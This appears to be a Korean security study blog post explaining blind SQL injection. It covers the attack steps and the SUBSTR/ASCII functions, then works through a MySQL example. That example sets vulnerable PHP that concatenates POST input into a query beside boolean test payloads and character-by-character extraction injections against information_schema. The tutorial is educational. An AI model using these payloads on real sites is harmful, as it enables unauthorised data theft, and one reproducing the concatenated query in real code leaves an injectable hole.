---
layout: post
comments: true
title: Blind SQL Injection 개념
excerpt: Blind SQL Injection 공격 과정 소개
date: 2024-11-28
last_modified_at: 2026-11-04
categories:
  - SECURITY
tags:
  - TIL
  - WEB
  - DATABASE
  - SECURITY
---

<!-- markdownlint-disable MD010 MD025 MD033 -->

# Blind SQL Injection

- SQL Injection: [SQL Injection의 전체 원리와 유형]({% post_url SECURITY/SECURITY_FUNDAMENTALS/2024-11-14-SQL-Injection %})
- 실습: [Blind SQL Injection CTF 풀이]({% post_url SECURITY/CTF/2024-11-29-CTF-SQL-Injection-6 %})

## Blind SQL Injection이란?

SQL 쿼리문 참과 거짓의 응답 차이를 비교해 정보를 추출하는 공격이다.

## 공격 과정

1. SQLi 가능 여부 확인
2. Blind SQLi
	1. 데이터 개수 확인(table, column, data 순으로 반복)
	2. 데이터 문자를 1개씩 추출(`substr()`, `ascii()` 등 사용)
	3. 데이터 1개 추출
	4. 모든 데이터 추출
3. 원하는 데이터 추출

## 선수 지식

### `substr()`/`substring()`

문자열의 특정 부분을 추출한다.

| DBMS 종류                             | 함수명         | 표준 문법 예시                        |
| ----------------------------------- | ----------- | ------------------------------- |
| **MySQL / PostgreSQL / SQL Server** | `SUBSTRING` | `SUBSTRING(문자열, 시작_위치, 추출할_길이)` |
| **Oracle / MySQL / SQLite**         | `SUBSTR`    | `SUBSTR(문자열, 시작_위치, 추출할_길이)`    |

> ※ **MySQL**은 `SUBSTRING()`과 `SUBSTR()`을 모두 지원한다.

### `ascii()`

데이터를 ASCII 코드로 변환한다.

`ASCII(문자열)`

### `ascii()` × `substring()`

```SQL
SUBSTR('abc', 1, 1) # 'a'
ASCII('a') # 97
ASCII(SUBSTR('abc', 1, 1)) # 97
```

## MySQL 예제

```PHP
$user_id = $_POST['user_id'];
$query = "SELECT * FROM users WHERE id = '$user_id'";
$res = $conn -> query($query);
```

1. SQLi 가능 여부 확인
	- `test' AND '1'='1` → 로그인 성공
	- `test' AND '1'='2` → 로그인 실패
2. Blind SQLi(참과 거짓 반응 확인)
	1. 데이터 개수 확인(database, table, column, data 순으로 반복)

		```SQL
		# 테이블 개수 확인
		test'
		AND (
			SELECT COUNT(table_name)
			FROM information_schema.tables
			WHERE table_schema = '<DATABASE_NAME>'
		)
		AND '1' = '1
		```

	2. 데이터 문자를 1개씩 추출(`substr()`, `ascii()` 등 사용)

		```SQL
		# 데이터베이스 1번째 글자 추출
		test'
		AND (
			ASCII(SUBSTR((SELECT DATABASE()), 1, 1)) > 0
		)
		AND '1' = '1
		```

	3. 데이터 1개 추출

		```SQL
		# 데이터베이스 1번째 글자 추출 -> 'a'
		test'
		AND (
			ASCII(SUBSTR((SELECT DATABASE()), 1, 1)) = 97
		)
		AND '1' = '1
		```
		
	4. 모든 데이터 추출
3. 원하는 데이터 추출

## 출처

- 사바라다. 「database 이름 짓기」. [Tistory](https://sabarada.tistory.com/49)

<div class="obsidian-links" style="display: none;">

[\[SECURITY\] SQL Injection 정리](2024-11-14-SQL-Injection.md)
[\[CTF\] CTF 문제 풀이: Blind SQL Injection](../CTF/2024-11-29-CTF-SQL-Injection-6.md)

</div>
